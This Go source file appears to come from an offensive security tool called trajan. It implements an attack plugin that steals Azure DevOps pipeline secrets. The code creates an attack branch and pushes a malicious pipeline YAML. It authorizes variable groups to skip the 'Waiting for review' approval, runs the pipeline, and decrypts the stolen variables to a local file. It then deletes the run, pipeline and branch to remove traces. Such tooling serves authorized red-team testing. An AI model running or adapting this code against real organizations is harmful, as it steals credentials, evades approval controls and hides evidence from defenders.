package secretsdump

import (
	"context"
	"fmt"
	"strings"
	"time"

	"github.com/praetorian-inc/trajan/internal/registry"
	"github.com/praetorian-inc/trajan/pkg/attacks"
	"github.com/praetorian-inc/trajan/pkg/attacks/audit"
	"github.com/praetorian-inc/trajan/pkg/attacks/base"
	"github.com/praetorian-inc/trajan/pkg/azuredevops"
	"github.com/praetorian-inc/trajan/pkg/azuredevops/attacks/common"
	"github.com/praetorian-inc/trajan/pkg/crypto"
	"github.com/praetorian-inc/trajan/pkg/detections"
)

func init() {
	registry.RegisterAttackPlugin("azuredevops", "ado-secrets-dump", func() attacks.AttackPlugin {
		return New()
	})
}

// Plugin implements secrets exfiltration via pipeline execution on Azure DevOps.
// Without --group: dumps all discovered variable groups + environment variables.
// With --group: dumps only the specified variable group's variables.
type Plugin struct {
	base.BaseAttackPlugin
}

// New creates a new ADO secrets dump attack plugin
func New() *Plugin {
	return &Plugin{
		BaseAttackPlugin: base.NewBaseAttackPlugin(
			"ado-secrets-dump",
			"Exfiltrate pipeline secrets via malicious pipeline YAML on Azure DevOps",
			"azuredevops",
			attacks.CategorySecrets,
		),
	}
}

// CanAttack checks if secrets dump is applicable
func (p *Plugin) CanAttack(findings []detections.Finding) bool {
	return common.FindingHasType(findings, detections.VulnTokenExposure) ||
		common.FindingHasType(findings, detections.VulnUnredactedSecrets) ||
		common.FindingHasType(findings, detections.VulnPullRequestSecretsExposure)
}

// Execute performs the secrets dump attack on Azure DevOps
func (p *Plugin) Execute(ctx context.Context, opts attacks.AttackOptions) (*attacks.AttackResult, error) {
	audit.LogAttackStart(opts.SessionID, p.Name(), opts.Target, opts.DryRun)

	result := &attacks.AttackResult{
		Plugin:    p.Name(),
		SessionID: opts.SessionID,
		Timestamp: time.Now(),
	}

	// Get ADO client
	client, err := common.GetADOClient(opts.Platform)
	if err != nil {
		result.Success = false
		result.Message = err.Error()
		return result, err
	}

	// Parse project/repo from target value
	project, repo, err := common.ParseProjectRepo(opts.Target.Value)
	if err != nil {
		result.Success = false
		result.Message = err.Error()
		return result, err
	}

	// Determine mode: single group (--group) vs all groups
	var targetGroupName string
	if opts.ExtraOpts != nil {
		targetGroupName = opts.ExtraOpts["group"]
	}
	includeEnvVars := targetGroupName == ""

	// Generate RSA keypair for hybrid encryption
	keyPair, err := crypto.GenerateKeyPair()
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to generate RSA keypair: %v", err)
		return result, err
	}
	publicKeyPEM, err := keyPair.PublicKeyPEM()
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to export public key: %v", err)
		return result, err
	}
	privateKeyPEM := keyPair.PrivateKeyPEM()

	// Discover variable groups
	var discoveredGroups []azuredevops.VariableGroup
	allGroups, err := client.ListVariableGroups(ctx, project)
	if err != nil {
		if targetGroupName != "" {
			// Fatal when targeting a specific group
			result.Success = false
			result.Message = fmt.Sprintf("failed to list variable groups: %v", err)
			return result, err
		}
		// Non-fatal for broad dump: continue without variable groups
		fmt.Printf("Warning: failed to list variable groups: %v\n", err)
	} else if targetGroupName != "" {
		// Single group mode: find the specified group
		for _, g := range allGroups {
			if g.Name == targetGroupName {
				discoveredGroups = append(discoveredGroups, g)
				break
			}
		}
		if len(discoveredGroups) == 0 {
			result.Success = false
			result.Message = fmt.Sprintf("variable group '%s' not found in project '%s'", targetGroupName, project)
			return result, fmt.Errorf("variable group not found: %s", targetGroupName)
		}
	} else {
		// All groups mode
		discoveredGroups = allGroups
	}

	// Get repository to find default branch and repository ID
	repository, err := client.GetRepository(ctx, project, repo)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to get repository: %v", err)
		return result, err
	}

	defaultBranch := repository.DefaultBranch
	if defaultBranch == "" {
		defaultBranch = "refs/heads/main"
	}
	// Strip refs/heads/ prefix
	defaultBranch = strings.TrimPrefix(defaultBranch, "refs/heads/")

	// Get commit ID for default branch
	branches, err := client.ListGitBranches(ctx, project, repo)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to list branches: %v", err)
		return result, err
	}

	var commitID string
	refName := "refs/heads/" + defaultBranch
	for _, branch := range branches {
		if branch.Name == refName {
			commitID = branch.ObjectID
			break
		}
	}

	if commitID == "" {
		result.Success = false
		result.Message = fmt.Sprintf("failed to find default branch: %s", defaultBranch)
		return result, fmt.Errorf("branch not found: %s", defaultBranch)
	}

	branchName := fmt.Sprintf("trajan-secrets-%s", opts.SessionID)
	pipelinePath := "azure-pipelines-trajan-secrets.yml"

	// Generate encrypted pipeline YAML with structured output
	pipelineYAML := common.GenerateEncryptedPipelineYAML(publicKeyPEM, discoveredGroups, includeEnvVars)

	if opts.DryRun {
		result.Success = true
		if targetGroupName != "" {
			result.Message = fmt.Sprintf("[DRY RUN] Would extract variables from variable group '%s' in %s/%s",
				targetGroupName, project, repo)
		} else {
			result.Message = fmt.Sprintf("[DRY RUN] Would create secrets dump attack on %s/%s", project, repo)
		}
		result.Artifacts = []attacks.Artifact{
			{
				Type:        attacks.ArtifactBranch,
				Identifier:  branchName,
				Description: "Attack branch",
			},
			{
				Type:        attacks.ArtifactWorkflow,
				Identifier:  fmt.Sprintf("pipeline:%d", 0), // Placeholder for dry run
				Description: "Pipeline definition",
			},
		}
		result.CleanupActions = []attacks.CleanupAction{
			{
				Type:        attacks.ArtifactWorkflow,
				Identifier:  fmt.Sprintf("pipeline:%d", 0),
				Action:      "delete",
				Description: "Delete pipeline definition",
			},
			{
				Type:        attacks.ArtifactBranch,
				Identifier:  branchName,
				Action:      "delete",
				Description: "Delete attack branch",
			},
		}
		dryRunData := map[string]interface{}{
			"branch":          branchName,
			"pipeline_path":   pipelinePath,
			"project":         project,
			"repo":            repo,
			"private_key_pem": privateKeyPEM,
		}
		if targetGroupName != "" {
			dryRunData["group_name"] = targetGroupName
		}
		result.Data = dryRunData
		return result, nil
	}

	// Create attack branch
	err = client.CreateBranch(ctx, project, repo, branchName, commitID)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to create branch: %v", err)
		return result, err
	}

	result.Artifacts = append(result.Artifacts, attacks.Artifact{
		Type:        attacks.ArtifactBranch,
		Identifier:  branchName,
		Description: "Attack branch created",
	})

	branches, err = client.ListGitBranches(ctx, project, repo)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to list branches: %v", err)
		return result, err
	}

	var newBranchCommitID string
	newRefName := "refs/heads/" + branchName
	for _, branch := range branches {
		if branch.Name == newRefName {
			newBranchCommitID = branch.ObjectID
			break
		}
	}

	if newBranchCommitID == "" {
		result.Success = false
		result.Message = fmt.Sprintf("failed to find new branch: %s", branchName)
		return result, fmt.Errorf("branch not found: %s", branchName)
	}

	// Push malicious pipeline YAML to branch
	commitMsg := "Add secrets dump pipeline"
	err = client.PushFile(ctx, project, repo, branchName, pipelinePath, pipelineYAML, commitMsg, newBranchCommitID)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to push pipeline file: %v", err)
		return result, err
	}

	// Create pipeline definition pointing to the malicious YAML
	pipelineReq := azuredevops.CreatePipelineRequest{
		Name:   fmt.Sprintf("trajan-secrets-%s", opts.SessionID),
		Folder: "\\",
	}
	pipelineReq.Configuration.Type = "yaml"
	pipelineReq.Configuration.Path = "/" + pipelinePath
	pipelineReq.Configuration.Repository.ID = repository.ID
	pipelineReq.Configuration.Repository.Type = "azureReposGit"

	pipeline, err := client.CreatePipeline(ctx, project, pipelineReq)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to create pipeline: %v", err)
		return result, err
	}

	result.Artifacts = append(result.Artifacts, attacks.Artifact{
		Type:        attacks.ArtifactWorkflow,
		Identifier:  fmt.Sprintf("pipeline:%d", pipeline.ID),
		Description: "Pipeline definition created",
	})

	// Authorize pipeline to access variable groups (bypass "Waiting for review")
	if len(discoveredGroups) > 0 {
		if err := common.AuthorizeVariableGroups(ctx, client, project, pipeline.ID, discoveredGroups); err != nil {
			// Non-fatal: log and continue
			fmt.Printf("Warning: failed to authorize variable groups: %v\n", err)
		}
	}

	// Run the pipeline on the attack branch
	runReq := azuredevops.RunPipelineRequest{}
	runReq.Resources.Repositories = map[string]struct {
		RefName string `json:"refName"`
	}{
		"self": {RefName: "refs/heads/" + branchName},
	}

	run, err := client.RunPipeline(ctx, project, pipeline.ID, runReq)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to run pipeline: %v", err)
		return result, err
	}

	// Poll for build completion - the run ID corresponds to a build
	var build *azuredevops.Build
	for i := 0; i < 60; i++ {
		select {
		case <-ctx.Done():
			fmt.Printf("Timeout: %v\n", ctx.Err())
		case <-time.After(5 * time.Second):
		}
		if ctx.Err() != nil {
			break
		}
		build, err = client.GetBuild(ctx, project, run.ID)
		if err != nil {
			if ctx.Err() != nil {
				fmt.Printf("Timeout: %v\n", ctx.Err())
				break
			}
			fmt.Printf("Warning: failed to get build status: %v\n", err)
			continue
		}
		if build.Status == "completed" {
			break
		}
	}

	// Cleanup helper for auto-cleanup after successful retrieval
	// Order matters: delete build run first, then pipeline definition, then branch
	cleanupActions := []attacks.CleanupAction{
		{
			Type:        attacks.ArtifactWorkflow,
			Identifier:  fmt.Sprintf("build:%d", run.ID),
			Action:      "delete",
			Description: "Delete pipeline run",
		},
		{
			Type:        attacks.ArtifactWorkflow,
			Identifier:  fmt.Sprintf("pipeline:%d", pipeline.ID),
			Action:      "delete",
			Description: "Delete pipeline definition",
		},
		{
			Type:        attacks.ArtifactBranch,
			Identifier:  branchName,
			Action:      "delete",
			Description: "Delete attack branch",
		},
	}

	// Base result data
	baseData := map[string]interface{}{
		"branch":          branchName,
		"pipeline_path":   pipelinePath,
		"pipeline_id":     pipeline.ID,
		"run_id":          run.ID,
		"project":         project,
		"repo":            repo,
		"private_key_pem": privateKeyPEM,
	}
	if targetGroupName != "" {
		baseData["group_name"] = targetGroupName
	}

	// Determine output file path
	outputPath := fmt.Sprintf("ado-secrets-%s.txt", opts.SessionID)
	if opts.ExtraOpts != nil && opts.ExtraOpts["output_file"] != "" {
		outputPath = opts.ExtraOpts["output_file"]
	}

	// Retrieve and decrypt secrets from pipeline artifact
	if build != nil && build.Status == "completed" {
		baseData["build_result"] = build.Result

		decrypted, err := common.RetrieveAndDecryptSecrets(ctx, client, project, pipeline.ID, run.ID, "encrypted-secrets", privateKeyPEM)
		if err != nil {
			// Retrieval failed — keep artifacts alive so user can retry with `trajan ado retrieve`
			fmt.Printf("Warning: failed to retrieve/decrypt secrets: %v\n", err)
			result.Success = true
			result.Message = fmt.Sprintf("Secrets dump pipeline executed but retrieval failed.\n  To retry: trajan ado retrieve --session %s",
				opts.SessionID)
			result.CleanupActions = cleanupActions
			result.Data = baseData
		} else {
			// Format structured output and write to file
			formatted, fmtErr := common.FormatStructuredSecrets(decrypted)
			if fmtErr != nil {
				fmt.Printf("Warning: failed to format secrets: %v\n", fmtErr)
				formatted = common.FormatDecryptedSecrets(decrypted)
			}

			if writeErr := common.WriteSecretsToFile(formatted, outputPath); writeErr != nil {
				fmt.Printf("Warning: failed to write secrets file: %v\n", writeErr)
			}

			summary := common.SecretsSummary(decrypted)
			baseData["output_file"] = outputPath
			baseData["secrets_file"] = outputPath

			result.Success = true
			result.Message = fmt.Sprintf("Secrets dump successful.\n  Secrets written to: %s\n  Summary: %s",
				outputPath, summary)
			result.Data = baseData

			// Auto-cleanup: secrets are on disk, no need to leave a footprint on ADO
			if cleanupErr := p.doCleanup(ctx, client, project, repo, cleanupActions); cleanupErr != nil {
				fmt.Printf("Warning: auto-cleanup failed: %v\n", cleanupErr)
				// Attach cleanup actions so user can retry manually
				result.CleanupActions = cleanupActions
			}
			// If cleanup succeeded, CleanupActions stays empty — nothing left to clean
		}
	} else if build != nil {
		// Build didn't complete — keep artifacts so user can retry with `trajan ado retrieve`
		result.Success = true
		result.Message = fmt.Sprintf("Build did not complete in time (status: %s).\n  To retry: trajan ado retrieve --session %s",
			build.Status, opts.SessionID)
		result.CleanupActions = cleanupActions
		result.Data = baseData
	} else {
		// Couldn't even get build status — keep artifacts for retry
		result.Success = true
		result.Message = fmt.Sprintf("Could not retrieve build status.\n  To retry: trajan ado retrieve --session %s",
			opts.SessionID)
		result.CleanupActions = cleanupActions
		result.Data = baseData
	}

	audit.LogAttackEnd(opts.SessionID, p.Name(), opts.Target, result)
	return result, nil
}

// Cleanup removes artifacts created by the attack (called via `trajan ado attack cleanup --session`)
func (p *Plugin) Cleanup(ctx context.Context, session *attacks.Session) error {
	client, err := common.GetADOClient(session.Platform)
	if err != nil {
		return err
	}

	project, repo, err := common.ParseProjectRepo(session.Target.Value)
	if err != nil {
		return err
	}

	for _, result := range session.Results {
		if result.Plugin != p.Name() {
			continue
		}
		if err := p.doCleanup(ctx, client, project, repo, result.CleanupActions); err != nil {
			return err
		}
	}

	return nil
}

// doCleanup performs the actual cleanup of pipeline definitions and branches.
// Used both for auto-cleanup after successful retrieval and manual cleanup via session.
func (p *Plugin) doCleanup(ctx context.Context, client *azuredevops.Client, project, repo string, actions []attacks.CleanupAction) error {
	for _, action := range actions {
		switch action.Type {
		case attacks.ArtifactWorkflow:
			// Handle both "pipeline:<ID>" (definition) and "build:<ID>" (run)
			var id int
			if _, err := fmt.Sscanf(action.Identifier, "build:%d", &id); err == nil {
				if err := client.DeleteBuild(ctx, project, id); err != nil {
					if strings.Contains(err.Error(), "404") || strings.Contains(err.Error(), "Not Found") {
						continue
					}
					if strings.Contains(err.Error(), "TF900561") || strings.Contains(err.Error(), "retention") {
						fmt.Printf("Warning: build %d is protected by retention leases and cannot be deleted automatically.\n", id)
						fmt.Printf("  To clean up manually, delete the retention leases in Azure DevOps project settings,\n")
						fmt.Printf("  then delete the build run.\n")
						continue
					}
					return fmt.Errorf("deleting build %d: %w", id, err)
				}
				continue
			}

			if _, err := fmt.Sscanf(action.Identifier, "pipeline:%d", &id); err != nil {
				fmt.Printf("Failed to parse identifier %s\n", action.Identifier)
				continue
			}

			if err := client.DeletePipeline(ctx, project, id); err != nil {
				if strings.Contains(err.Error(), "404") || strings.Contains(err.Error(), "Not Found") {
					continue
				}
				return fmt.Errorf("deleting pipeline %d: %w", id, err)
			}

		case attacks.ArtifactBranch:
			branches, err := client.ListGitBranches(ctx, project, repo)
			if err != nil {
				if strings.Contains(err.Error(), "404") || strings.Contains(err.Error(), "Not Found") {
					continue
				}
				return fmt.Errorf("listing branches for deletion: %w", err)
			}

			var commitID string
			refName := "refs/heads/" + action.Identifier
			for _, branch := range branches {
				if branch.Name == refName {
					commitID = branch.ObjectID
					break
				}
			}

			if commitID == "" {
				continue
			}

			if err := client.DeleteBranch(ctx, project, repo, action.Identifier, commitID); err != nil {
				if strings.Contains(err.Error(), "404") || strings.Contains(err.Error(), "Not Found") {
					continue
				}
				return fmt.Errorf("deleting branch %s: %w", action.Identifier, err)
			}
		}
	}

	return nil
}
